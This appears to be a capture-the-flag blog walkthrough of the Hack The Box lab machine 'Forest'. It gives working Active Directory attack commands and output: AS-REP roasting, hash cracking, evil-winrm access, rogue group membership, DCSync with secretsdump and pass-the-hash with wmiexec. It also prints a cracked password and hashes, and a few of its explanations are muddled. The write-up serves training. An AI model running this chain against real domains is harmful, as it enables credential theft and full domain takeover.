@@ -1,0 +1,400 @@
+I"[G<p>Walkthrough for Forest - 10.10.10.161</p>
+
+<h2 id="overview">Overview</h2>
+
+<h2 id="setup">Setup</h2>
+
+<p>Running Kali I make a temporary working directory, set some variables and update all the things.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>tmp <span class="o">&amp;&amp;</span> <span class="nb">cd </span>tmp
+<span class="nv">TARGET</span><span class="o">=</span>10.10.10.161
+<span class="nb">sudo </span>apt update <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt upgrade
+</code></pre></div></div>
+
+<h2 id="scanning">Scanning</h2>
+
+<script src="https://gist.github.com/bovinehero/27082b91d142f1506c6ea5a263ecbccd.js"> </script>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code></code></pre></div></div>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-Pn</span> <span class="nv">$TARGET</span> <span class="nt">-p-</span> <span class="nt">-T4</span>
+</code></pre></div></div>
+
+<p>I get</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-17 18:27 GMT
+Warning: 10.10.10.161 giving up on port because retransmission cap hit (6).
+Stats: 0:10:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+Nmap scan report for 10.10.10.161
+Host is up (0.077s latency).
+Not shown: 65511 closed ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49684/tcp open  unknown
+49698/tcp open  unknown
+49717/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1009.73 seconds
+</code></pre></div></div>
+
+<p>Looks like a domain controller</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -Pn $TARGET -A -T4
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-17 18:27 GMT
+Warning: 10.10.10.161 giving up on port because retransmission cap hit (6).
+Stats: 0:10:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 61.92% done; ETC: 18:43 (0:06:11 remaining)
+Nmap scan report for 10.10.10.161
+Host is up (0.077s latency).
+Not shown: 65511 closed ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49684/tcp open  unknown
+49698/tcp open  unknown
+49717/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1009.73 seconds
+bhero@bh-t430:~/OffSec/tmp$ sudo nmap -Pn $TARGET -A -T4
+[sudo] password for bhero: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-17 19:21 GMT
+Stats: 0:04:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.86% done; ETC: 19:26 (0:00:01 remaining)
+Nmap scan report for 10.10.10.161
+Host is up (0.039s latency).
+Not shown: 989 closed ports
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-12-17 19:28:41Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=12/17%Time=5DF92AC0%P=x86_64-pc-linux-gnu%r(DNS
+SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version
+SF:\x04bind\0\0\x10\0\x03");
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=12/17%OT=53%CT=1%CU=32521%PV=Y%DS=2%DC=T%G=Y%TM=5DF92B
+OS:D4%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=107%CI=I%TS=A)SEQ(SP=106%G
+OS:CD=1%ISR=107%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=107%TI=RD%CI=I%TS=A)OPS(O1=M
+OS:54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M54DNW8ST11%
+OS:O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%
+OS:DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
+OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
+OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
+OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
+OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
+OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=
+OS:Z)
+
+Network Distance: 2 hops
+Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h47m11s, deviation: 4h37m09s, median: 7m09s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: FOREST
+|   NetBIOS computer name: FOREST\x00
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: FOREST.htb.local
+|_  System time: 2019-12-17T11:31:11-08:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-12-17T19:31:12
+|_  start_date: 2019-12-17T17:43:24
+
+TRACEROUTE (using port 995/tcp)
+HOP RTT      ADDRESS
+1   21.58 ms 10.10.14.1
+2   22.27 ms 10.10.10.161
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 288.71 seconds
+</code></pre></div></div>
+
+<p>time to pull out the wintel testing kit.</p>
+
+<p>look for null shares:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.161
+</code></pre></div></div>
+
+<p>not allowed, try guest:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.161 <span class="nt">-u</span> invaliduser
+</code></pre></div></div>
+
+<p>ok I need a user to get access here, (pash the hash attack maybe?!?)</p>
+
+<p>try to smoke out some more details with enum4linux</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux 10.10.10.161 -A -vvv &gt; enum.txt
+</code></pre></div></div>
+
+<p>I get the HTB domain:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Found domain(s):
+
+        [+] HTB
+        [+] Builtin
+</code></pre></div></div>
+
+<p>some users:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Group 'Domain Users' (RID: 513) has member: HTB\sebastien
+Group 'Domain Users' (RID: 513) has member: HTB\lucinda
+Group 'Domain Users' (RID: 513) has member: HTB\svc-alfresco
+Group 'Domain Users' (RID: 513) has member: HTB\andy
+Group 'Domain Users' (RID: 513) has member: HTB\mark
+Group 'Domain Users' (RID: 513) has member: HTB\santi
+# also maybe HTB\Testtest321
+</code></pre></div></div>
+
+<p>I make a users.txt file in my working directory:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
+</code></pre></div></div>
+
+<p>Now we can start looking at different services, first we try to scrape the Kerberos service for Named Pipe credentials:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ <span class="nt">-usersfile</span> users.txt <span class="nt">-format</span> john <span class="nt">-outputfile</span> htb-forest <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> <span class="nv">$TARGET</span>
+</code></pre></div></div>
+
+<p>We attack named pipes because, by default they use a weak NTLM hashing, if we can poke a hash for one of our users we can attempt a crack and access a different service</p>
+
+<p>This gives us:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$krb5asrep$svc-alfresco@HTB.LOCAL:4b700daa13b316b435e2cc37ecdf3e16$76f55805d940061a0b2eccf8006af15823754b042d65f21ef2c4e8e4901961bf9cb04ca0009f4e6b0631ee7575e6f93a37596eef2f4aee4507544b54daf00d128c1c0fca2fcffc8923ca143aa9542d85390fb8ad86cfa65a8e58805de2471904b4464a3bc9c73a6cefee6bcbba8578954e12a6f68d535d9a43e8bee1f251e7d537d7690aa878e89e3591402f620e10b70f3169d79bbed0aa4b1445ad4ca9573dff6b0278820304dab52ac00c59748bf9c7592cc152cb37ceea51ad12194edf55ddf9156f4df81cee117a302f5b74b74b6565305d25b802596598271f5ba1e157a34d202c98c6
+</code></pre></div></div>
+
+<p>we hascat it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 18200 <span class="nt">--force</span> <span class="nt">-a</span> 0 htb-forest-hcat rockyou.txt
+</code></pre></div></div>
+
+<p>to get <code class="highlighter-rouge">s3rvice</code> as the password for svc-alfresco@HTB.LOCAL, I try to get the user SPN details:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py htb.local/svc-alfresco:s3rvice <span class="nt">-outputfile</span> htb-tgs.txt <span class="nt">-dc-ip</span> <span class="nv">$TARGET</span>
+</code></pre></div></div>
+
+<p>I get nothing:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+No entries found!
+</code></pre></div></div>
+
+<p>Ok, svc-alfresco doesn’t sound like a typical user. I want to find out the type so I use:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/svc-alfresco:s3rvice <span class="nt">-dc-ip</span> <span class="nv">$TARGET</span>
+</code></pre></div></div>
+
+<p>This shows that svc-alfresco is a service account:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
+------------  ------------------------------------------------------  --------------------------  --------------------------  --------
+svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2020-01-13 21:25:56.952118  2020-01-13 21:03:35.477540  0x410200 
+</code></pre></div></div>
+
+<p>A service account will allow me to interact with remote services in effect as a service rather than a user. From the nmap scan I notice that winrm is open, so I try it with the svc-alfresco creds and get a shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> svc-alfresco <span class="nt">-p</span> s3rvice <span class="c">#-e /usr/share/windows-resources/binaries/ </span>
+
+</code></pre></div></div>
+
+<p>/usr/share/windows-resources/binaries/</p>
+
+<p>Limited access, but access none the less.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Evil-WinRM shell v2.0
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; dir
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; whoami
+
+</code></pre></div></div>
+<p>htb\svc-alfresco</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+``` cmd
+cd ..\Desktop
+cat user.txt
+</code></pre></div></div>
+
+<p>give user:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>e5e4e47ae7022664cda6eb013fb0d9ed
+</code></pre></div></div>
+
+<p>ok time to escalate</p>
+
+<p>I drop the session and sync in with my local install of bloodhound. BloodHound/Ingestors directory</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> svc-alfresco <span class="nt">-p</span> s3rvice <span class="nt">-e</span> <span class="nb">.</span>
+</code></pre></div></div>
+
+<pre><code class="language-cmd">upload SharpHound.exe
+upload SharpHound.ps1
+upload PowerView.ps1
+Import-module ./SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All
+Invoke-BloodHound -Domain HTB -LDAPUser svc-alfresco -LDAPPass s3rvice -CollectionMethod All -ZipFileName test.zip
+download test.zip
+</code></pre>
+
+<p>Sample upload message:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Info: Uploading SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe
+
+Data: 1039700 bytes of 1039700 bytes copied
+
+Info: Upload successful!
+
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user pwnd s3rvice /add # make a domain user
+net group Exchange Windows Permissions pwnd /add
+net group "Exchange Trusted Subsystem" pwnd /add /domain
+net group "Exchange Windows Permissions" pwnd /add /domain
+net group "Exchange Windows Permissions" sebastien /add /domain
+net group "Exchange Windows Permissions" svc-alfresco /add /domain #do this only!?!?
+net localgroup "Remote Management Users" pwnd /add /domain
+net group "Enterprise Admins" pwnd /add /domain
+</code></pre></div></div>
+
+<p>exit the shell and use:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aclpwn <span class="nt">-f</span> svc-alfresco <span class="nt">-t</span> htb.local <span class="nt">-d</span> htb.local <span class="nt">-s</span> 10.10.10.161 <span class="nt">-u</span> svc-alfresco <span class="nt">-p</span> s3rvice
+<span class="c"># aclpwn -f svc-alfresco -t htb.local -d htb.local -s 10.10.10.161 -u svc-alfresco -p s3rvice -du neo4j -dp neo4j</span>
+</code></pre></div></div>
+
+<p>Tried both options</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py <span class="nt">-just-dc-ntlm</span> HTB/svc-alfresco:s3rvice@10.10.10.161
+</code></pre></div></div>
+
+<p>get the admin hash and run:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+</code></pre></div></div>
+
+<p>Gives us admin!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+htb\administrator
+</code></pre></div></div>
+
+<h2 id="bonus">Bonus</h2>
+
+<p>Getting impacket</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get <span class="nb">install </span>python-pip
+<span class="nb">sudo </span>pip <span class="nb">install </span>impacket
+<span class="nb">ls</span> /usr/share/doc/python3-impacket/examples/ <span class="c">#scripts</span>
+</code></pre></div></div>
+
+<p>Getting Bloodhound</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get <span class="nb">install </span>bloodhound
+<span class="nb">sudo </span>neo4j console <span class="c">#change the password</span>
+git clone https://github.com/BloodHoundAD/BloodHound.git
+</code></pre></div></div>
+
+<p>Getting evil winrm</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>gem <span class="nb">install </span>evil-winrm
+
+
+</code></pre></div></div>
+
+<p>Get aclpwn</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install aclpwn
+</code></pre></div></div>
+
+<p>using impacket in python: https://pen-testing.sans.org/blog/2013/03/27/psexec-python-rocks</p>
+
+<p>Setting up rockyou</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cp /usr/share/wordlists/rockyou.txt.gz .
+sudo gunzip rockyou.txt.gz
+iconv -f ISO-8859-1 -t UTF-8 rockyou.txt &gt; rockyou_utf8.txt
+</code></pre></div></div>
+
+<p>this? https://www.youtube.com/watch?time_continue=1541&amp;v=2Xfd962QfPs&amp;feature=emb_logo</p>
+:ET
